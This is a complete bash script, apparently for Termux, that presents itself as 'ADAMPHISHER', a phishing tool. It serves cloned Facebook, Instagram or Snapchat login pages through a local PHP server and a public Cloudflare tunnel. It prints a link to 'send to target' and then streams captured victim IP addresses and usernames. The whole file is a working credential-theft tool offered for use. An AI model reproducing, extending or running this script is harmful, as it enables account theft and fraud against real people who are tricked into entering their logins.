
#!/bin/bash

# ADAMPHISHER by Adam & Inass
# Lightweight phishing tool using PHP + Cloudflared

# Colors
r='\033[1;31m'
g='\033[1;32m'
c='\033[1;36m'
w='\033[1;37m'

# Banner
banner() {
    clear
    echo -e "$c"
    echo "   ▄▄▄       ████╗  ███████╗ ██╗  ██╗██████╗ ██╗███████╗██╗  ██╗"
    echo "  ████╗     ██╔═██╗ ██╔════╝ ██║  ██║██╔══██╗██║██╔════╝██║ ██╔╝"
    echo " ██╔██║     █████═╝ █████╗   ███████║██████╔╝██║███████╗█████╔╝ "
    echo " ██║╚██╗    ██╔═██╗ ██╔══╝   ██╔══██║██╔═══╝ ██║╚════██║██╔═██╗ "
    echo " ╚═╝ ╚═╝    ██║ ╚██╗███████╗ ██║  ██║██║     ██║███████║██║ ╚██╗"
    echo "            ╚═╝  ╚═╝╚══════╝ ╚═╝  ╚═╝╚═╝     ╚═╝╚══════╝╚═╝  ╚═╝ v1.0"
    echo -e "$w"
    echo "────────────────────────────────────────────────────────────"
    echo -e "$g   By     : Adam & Inass"
    echo -e "$g   Github : https://github.com/rcagh"
    echo -e "$g   Tool   : Light Phishing (Cloudflared Tunnel)"
    echo "────────────────────────────────────────────────────────────"
}

# Dependencies check
check_deps() {
    for i in php curl wget; do
        if ! command -v $i > /dev/null 2>&1; then
            echo -e "$r[!] $i not found. Installing...$w"
            pkg install $i -y > /dev/null 2>&1
        fi
    done
    if [ ! -f cloudflared ]; then
        echo -e "$c[~] Downloading Cloudflared...$w"
        wget https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm -O cloudflared > /dev/null 2>&1
        chmod +x cloudflared
    fi
}

# Phishing pages
choose_site() {
    echo -e "$w\n[+] Choose a site to phish:\n"
    echo -e " $g[01]$w Facebook"
    echo -e " $g[02]$w Instagram"
    echo -e " $g[03]$w Snapchat"
    echo -e " $g[04]$w Exit"
    read -p $'\n[>] Option: ' opt
    case $opt in
        1|01) site="facebook";;
        2|02) site="instagram";;
        3|03) site="snapchat";;
        4|04) exit;;
        *) echo -e "$r[!] Invalid option$w" && sleep 1 && choose_site;;
    esac
}

# Start PHP and Cloudflared
start_server() {
    echo -e "$c[~] Starting PHP server...$w"
    php -S 127.0.0.1:8080 -t sites/$site/ > /dev/null 2>&1 &
    sleep 2
    echo -e "$c[~] Starting Cloudflared tunnel...$w"
    ./cloudflared tunnel --url http://127.0.0.1:8080 > .link.log 2>/dev/null &
    sleep 5
    link=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' .link.log)
    echo -e "\n$g[+] Send this link to target: $c$link$w"
    echo -e "$w[~] Waiting for victim... Press Ctrl+C to stop.\n"
    tail -f sites/$site/ip.txt 2>/dev/null &
    tail -f sites/$site/usernames.txt 2>/dev/null
}

# Main
banner
check_deps
choose_site
start_server
